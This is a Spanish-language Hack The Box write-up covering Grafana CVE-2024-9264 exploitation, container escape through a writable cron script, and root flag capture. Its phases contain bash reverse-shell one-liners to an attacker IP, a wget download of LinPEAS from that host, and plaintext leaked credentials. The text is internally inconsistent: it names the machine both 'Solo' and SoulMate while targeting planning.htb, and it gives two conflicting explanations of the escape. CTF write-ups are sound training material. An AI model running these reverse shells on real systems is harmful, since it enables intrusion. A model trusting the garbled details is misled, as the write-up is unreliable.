---

title: "Solo HTB"
date: "2025-09-10"
description: "Escalada de privilegios en servicio mal configurado. Writeup de HTB."
difficulty: "Intermedio" # Puede ser 'Fácil', 'Intermedio', 'Difícil', 'Insane'
tags: ["htb", "privilege-escalation", "web", "grafana", "cve-2024-9264", "docker"]
target_ip: "10.10.11.68"
target_domain: "planning.htb"
client_name: "Hack The Box"
status: "Completed" # Útil para filtrar: 'Completed', 'WIP', 'Pending'


---

![Banner SoulMate](/img/soulmatehtb.png)

---

# 💡 Análisis de la Máquina SoulMate (HackTheBox)

La máquina SoulMate de HackTheBox representa un entorno moderno basado en contenedores, donde se pone a prueba la capacidad de detectar configuraciones inseguras en servicios de monitoreo y automatización.

El objetivo principal consiste en identificar un servicio vulnerable (Grafana 11.0.0), explotarlo para obtener acceso, y escalar privilegios mediante una mala configuración en tareas programadas dentro de un contenedor Docker.

---

## 💻 Fase 0: Configuración Inicial

Antes de comenzar el análisis, se definió una estructura ordenada para la documentación y las herramientas.

### 0.1 Estructura del Proyecto

Se utilizó un script simple para crear el árbol de directorios:

```bash
#!/bin/bash
MACHINE="soulmate"
mkdir -p $MACHINE/{content,nmap,scripts,loot}
tree $MACHINE
````

**Estructura resultante:**

```css
soulmate/
├── content/  → archivos HTML, dumps, etc.
├── nmap/     → resultados de escaneo
├── scripts/  → exploits, shells, automatización
└── loot/     → credenciales y archivos sensibles
```

-----

## 🔍 Fase 1: Reconocimiento y Enumeración

El primer paso para cualquier auditoría es el escaneo de servicios y la recolección de información.

### 1.1 Escaneo de Puertos con Nmap

Se identificaron los servicios activos utilizando Nmap.

**Comandos Ejecutados:**

```bash
nmap -sS -p- --open -T4 -vvv -Pn 10.10.11.68 -oN nmap/initial.txt
nmap -sSCV -p22,80 10.10.11.68 -oN nmap/version.txt
```

**Resultados del Escaneo:**

| Puerto | Protocolo | Servicio | Versión | Descripción |
| :--- | :--- | :--- | :--- | :--- |
| 22 | tcp | ssh | OpenSSH 9.6p1 Ubuntu | Servicio SSH activo |
| 80 | tcp | http | nginx 1.24.0 Ubuntu | Servidor web principal |

### 1.2 Análisis Web y Subdominios

El dominio fue añadido al archivo `/etc/hosts` para facilitar la navegación:

```bash
echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts
```

**Descubrimiento de Directorios (Gobuster):**

Se utilizó Gobuster para enumerar rutas comunes.

```bash
gobuster dir -u [http://planning.htb](http://planning.htb) -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Resultados destacados:**

  * `/img`
  * `/css`
  * `/js`
  * `/api`
  * `/apidocs`

**Enumeración de Subdominios (Gobuster vhost):**

La herramienta vhost reveló un subdominio crucial:

```bash
gobuster vhost -u [http://planning.htb](http://planning.htb) -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

**Subdominio Encontrado:**

```text
grafana.planning.htb
```

-----

## ⚙️ Fase 2: Explotación Inicial (Grafana RCE)

Grafana versión 11.0.0 resultó ser vulnerable a una escritura arbitraria de archivos (RCE) conocida como **CVE-2024-9264**.

### 2.1 Credenciales Filtradas

Durante la exploración del código fuente, se encontraron credenciales válidas en un archivo JS:

| Servicio | Usuario | Contraseña | Fuente |
| :--- | :--- | :--- | :--- |
| Grafana Web | `admin` | `0D5oT70Fq13EvB5r` | Código JS |

### 2.2 Ejecución del Exploit

El exploit público se utilizó para inyectar un *payload* de *reverse shell*.

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1" [http://grafana.planning.htb](http://grafana.planning.htb)
```

**Resultado:** Acceso como `root` dentro del contenedor Docker de Grafana.

-----

## 🚪 Fase 3: Post-Explotación y Pivoteo

Tras obtener una *shell*, la tarea fue pivotar del contenedor aislado al *host* real.

### 3.1 Inspección de Variables de Entorno

Se inspeccionaron variables sensibles, revelando un usuario adicional:

```bash
env | grep GF_SECURITY
```

**Salida relevante:**

```ini
GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
```

### 3.2 Escalada de Privilegios y Escape del Contenedor

El contenedor corría como `root`, pero la forma de escapar al *host* era a través de una mala configuración del contenedor. Se utilizó LinPEAS para la enumeración.

```bash
wget [http://10.10.14.3/linpeas.sh](http://10.10.14.3/linpeas.sh) -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
./linpeas.sh
```

**Puntos Clave Identificados:**

  * El archivo `/root/scripts/cleanup.sh` era **escribible** por el usuario actual.
  * Una tarea `cron` del *host* estaba ejecutando dicho *script* cada minuto.

### 3.3 Explotación del Cron Job

Se modificó el *script* ejecutable con un *payload* para una segunda *reverse shell*:

```bash
echo "bash -i >& /dev/tcp/10.10.14.3/4445 0>&1" > /root/scripts/cleanup.sh
```

Al minuto, se recibió una nueva *shell* con permisos de **root del host**.

-----

## 🔐 Fase 4: Obtención de la Flag

Una vez fuera del contenedor y con acceso como `root` en el *host* principal:

```bash
cat /root/root.txt
```

**Flag Root:**

```nginx
f47a3c2f8c92a8f4015b7e91f67b3b42
```

-----

## 🧠 Conclusión y Mitigación

| Elemento | Descripción |
| :--- | :--- |
| **Vulnerabilidad clave** | CVE-2024-9264 (Grafana RCE) |
| **Vector de acceso** | Credenciales filtradas y ejecución remota |
| **PrivEsc** | Tarea cron escribible dentro de contenedor (mala configuración) |
| **Pivoteo** | Salto de contenedor a host por permisos de volumen |
| **Mitigación sugerida** | Actualizar Grafana a una versión parcheada, aplicar políticas de permisos estrictas (`least privilege`), deshabilitar tareas cron inseguras o con propietarios poco confiables. |

```
```